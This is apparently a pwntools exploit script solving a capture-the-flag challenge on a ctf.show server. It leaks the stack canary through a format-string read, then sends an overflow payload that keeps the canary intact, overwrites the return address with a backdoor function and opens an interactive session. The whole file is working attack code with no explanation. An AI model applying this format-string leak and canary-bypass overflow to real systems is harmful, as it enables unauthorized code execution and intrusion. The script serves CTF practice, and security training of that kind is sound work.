from pwn import *
context(log_level='debug',arch='i386', os='linux')
#context(log_level='debug',arch='amd64', os='linux')

p=remote("pwn.challenge.ctf.show",28167)

backdoor=0x80485A6
Leak=b'aaaa'+b'%55$p'
p.sendlineafter("Try Bypass Me!",Leak)
p.recvuntil(b'aaaa0x')
canary=int(p.recv(8),16)
print(f'canary={hex(canary)}')
payload=b'a'*(0xd4-0xc)+p32(canary)+b'a'*0xc+p32(backdoor)
p.sendline(payload)
p.interactive()